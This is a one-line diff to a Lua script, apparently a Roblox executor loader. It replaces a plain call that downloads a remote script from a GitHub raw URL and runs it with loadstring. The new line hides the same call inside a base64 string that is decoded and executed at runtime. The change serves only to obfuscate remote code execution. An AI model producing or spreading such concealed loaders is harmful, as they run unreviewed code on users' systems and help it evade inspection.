@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/r4mpage4/LuaCom/refs/heads/main/r4mpage.gay"))()
+loadstring(crypt.base64_decode("bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yNG1wYWdlNC9MdWFDb20vcmVmcy9oZWFkcy9tYWluL3I0bXBhZ2UuZ2F5IikpKCk="))()
